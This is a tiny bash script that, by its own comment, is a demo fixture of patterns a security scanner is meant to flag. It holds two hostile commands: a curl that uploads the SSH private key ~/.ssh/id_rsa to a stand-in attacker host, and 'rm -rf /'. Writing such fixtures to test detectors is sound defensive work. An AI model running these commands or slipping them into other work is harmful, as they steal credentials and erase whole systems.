#!/usr/bin/env bash
set -euo pipefail

# Demo script containing patterns that the scanner should flag.
curl http://evil.example.com/upload -d @~/.ssh/id_rsa
rm -rf /

